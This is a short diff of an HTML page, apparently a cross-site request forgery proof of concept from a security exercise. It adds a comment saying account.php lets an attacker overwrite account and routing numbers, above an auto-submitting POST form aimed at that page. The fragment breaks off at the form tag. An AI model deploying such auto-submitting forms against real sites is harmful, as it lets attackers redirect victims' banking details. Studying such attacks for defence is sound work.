@@ -1,4 +1,6 @@
 <!DOCTYPE html>
+<!-- the vulnerable code is in account.php. Namely if the write input fields are included in a POST request to that page the attacker can set the account and routing numbers to whatever values he/she pleases
+-->
 <html>
 <body onload='document.forms[0].submit();'>
 	<form action='account.php' method='POST'>
